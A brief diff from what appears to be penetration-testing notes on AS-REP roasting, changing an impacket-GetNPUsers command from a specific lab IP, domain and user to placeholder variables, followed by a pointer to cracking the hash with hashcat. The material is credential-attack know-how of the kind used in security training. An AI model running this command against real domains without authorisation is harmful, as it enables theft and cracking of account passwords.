@@ -9,7 +9,7 @@ Queries target domain for users with 'Do not require Kerberos preauthentication'
 
 ```bash
 # Pull 
-impacket-GetNPUsers -request -dc-ip 192.168.50.70 -outputfile hashes.asreproast corp.com/pete
+impacket-GetNPUsers -request -dc-ip $IP -outputfile hashes.asreproast $DOMAIN/$USER
 ```
 
 Crack the hash in hashcat
